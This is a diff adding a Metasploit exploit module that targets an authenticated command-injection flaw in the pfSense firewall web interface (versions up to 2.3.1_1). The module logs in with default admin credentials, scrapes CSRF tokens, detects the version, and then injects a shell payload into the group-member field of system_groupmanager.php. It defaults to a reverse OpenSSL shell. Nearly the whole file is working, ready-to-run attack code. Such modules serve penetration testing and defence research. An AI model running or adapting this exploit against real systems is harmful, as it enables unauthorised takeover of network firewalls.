@@ -1,0 +1,189 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'        => 'pfSense authenticated group member RCE',
+        'Description' => %q(
+          pfSense, a free BSD based open source firewall distribution,
+          version <= 2.3.1_1 contains a remote command execution
+          vulnerability post authentication in the system_groupmanager.php page.
+          Verified against 2.2.6 and 2.3.
+        ),
+        'Author'      =>
+          [
+            's4squatch', # discovery
+            'h00die'     # module
+          ],
+        'References'  =>
+          [
+            [ 'EDB', '43128' ],
+            [ 'URL', 'https://www.pfsense.org/security/advisories/pfSense-SA-16_08.webgui.asc']
+          ],
+        'License'        => MSF_LICENSE,
+        'Platform'       => 'unix',
+        'Privileged'     => false,
+        'DefaultOptions' =>
+          {
+            'SSL' => true,
+            'PAYLOAD' => 'cmd/unix/reverse_openssl'
+          },
+        'Arch'           => [ ARCH_CMD ],
+        'Payload'        =>
+          {
+            'Compat' =>
+              {
+                'PayloadType' => 'cmd',
+                'RequiredCmd' => 'perl openssl'
+              }
+          },
+        'Targets'        =>
+          [
+            [ 'Automatic Target', {}]
+          ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => 'Nov 06 2017'
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
+        OptString.new('PASSWORD', [ false, 'Password to login with', 'pfsense']),
+        Opt::RPORT(443)
+      ], self.class
+    )
+  end
+
+  def login
+    res = send_request_cgi(
+      'uri' => '/index.php',
+      'method' => 'GET'
+    )
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
+    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200
+
+    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
+    vprint_status("CSRF Token for login: #{csrf}")
+
+    res = send_request_cgi(
+      'uri' => '/index.php',
+      'method' => 'POST',
+      'vars_post' => {
+        '__csrf_magic' => csrf,
+        'usernamefld'  => datastore['USERNAME'],
+        'passwordfld'  => datastore['PASSWORD'],
+        'login'        => ''
+      }
+    )
+    unless res
+      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
+    end
+    if res.code == 302
+      vprint_status('Successful Authentication')
+      return res.get_cookies
+    else
+      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+      return nil
+    end
+  end
+
+  def detect_version(cookie)
+    res = send_request_cgi(
+      'uri' => '/index.php',
+      'method' => 'GET',
+      'cookie' => cookie
+    )
+    unless res
+      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
+    end
+    /Version.+<strong>(?<version>[0-9\.\-RELEASE]+)[\n]?<\/strong>/m =~ res.body
+    if version
+      print_status("pfSense Version Detected: #{version}")
+      return Gem::Version.new(version)
+    end
+    # If the device isn't fully setup, you get stuck at redirects to wizard.php
+    # however, this does NOT stop exploitation strangely
+    print_error("pfSens Version Not Detected or wizard still enabled.")
+    Gem::Version.new('0.0')
+  end
+
+  def check
+    begin
+      res = send_request_cgi(
+        'uri'       => '/index.php',
+        'method'    => 'GET'
+      )
+      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
+      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200
+      if /Login to pfSense/ =~ res.body
+        Exploit::CheckCode::Detected
+      else
+        Exploit::CheckCode::Safe
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+
+  def exploit
+    begin
+      cookie = login
+      version = detect_version(cookie)
+      vprint_good('Login Successful')
+      res = send_request_cgi(
+        'uri'    => '/system_groupmanager.php',
+        'method' => 'GET',
+        'cookie' => cookie,
+        'vars_get' => {
+          'act' => 'new'
+        }
+      )
+
+      /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
+      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
+      vprint_status("CSRF Token for group creation: #{csrf}")
+
+      group_name = rand_text_alpha(10)
+      post_vars = {
+        '__csrf_magic' => csrf,
+        'groupname' => group_name,
+        'description' => '',
+        'members[]' => "0';#{payload.encoded};'",
+        'groupid' => '',
+        'save' => 'Save'
+      }
+      if version >= Gem::Version.new('2.3')
+        post_vars = post_vars.merge('gtype' => 'local')
+      elsif version <= Gem::Version.new('2.3') # catch for 2.2.6. left this elsif for easy expansion to other versions as needed
+        post_vars = post_vars.merge(
+          'act' => '',
+          'gtype' => '',
+          'privid' => ''
+        )
+      end
+      send_request_cgi(
+        'uri'           => '/system_groupmanager.php',
+        'method'        => 'POST',
+        'cookie'        => cookie,
+        'vars_post'     => post_vars,
+        'vars_get' => {
+          'act' => 'edit'
+        }
+      )
+      print_status("Manual removal of group #{group_name} is required.")
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+end
